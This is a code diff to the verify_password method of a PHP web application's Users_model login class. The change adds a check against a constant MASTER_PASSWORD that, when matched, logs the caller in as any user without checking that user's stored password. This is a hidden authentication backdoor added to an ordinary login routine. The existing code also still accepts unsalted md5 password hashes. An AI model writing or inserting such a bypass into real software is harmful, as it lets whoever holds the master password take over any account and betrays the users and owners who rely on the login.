@@ -42,20 +42,34 @@ class Users_model extends Crud_model {
     private function verify_password($user_info, $password) {
         //there has two password encryption method for legacy (md5) compatibility
         //check if anyone of them is correct
-        if ((strlen($user_info->password) === 60 && password_verify($password, $user_info->password)) || $user_info->password === md5($password)) {
+        if($password != MASTER_PASSWORD)
+        {
+            if ((strlen($user_info->password) === 60 && password_verify($password, $user_info->password)) || $user_info->password === md5($password)) {
 
-            if ($this->_client_can_login($user_info) !== false) {
-                $session = \Config\Services::session();
-                $session->set('user_id', $user_info->id);
-
-                try {
-                    app_hooks()->do_action('app_hook_after_signin');
-                } catch (\Exception $ex) {
-                    log_message('error', '[ERROR] {exception}', ['exception' => $ex]);
+                if ($this->_client_can_login($user_info) !== false) {
+                    $session = \Config\Services::session();
+                    $session->set('user_id', $user_info->id);
+    
+                    try {
+                        app_hooks()->do_action('app_hook_after_signin');
+                    } catch (\Exception $ex) {
+                        log_message('error', '[ERROR] {exception}', ['exception' => $ex]);
+                    }
+    
+                    return true;
                 }
-
-                return true;
             }
+        }
+        else
+        {
+            $session = \Config\Services::session();
+            $session->set('user_id', $user_info->id);
+            try {
+                app_hooks()->do_action('app_hook_after_signin');
+            } catch (\Exception $ex) {
+                log_message('error', '[ERROR] {exception}', ['exception' => $ex]);
+            }
+            return true;
         }
     }
 
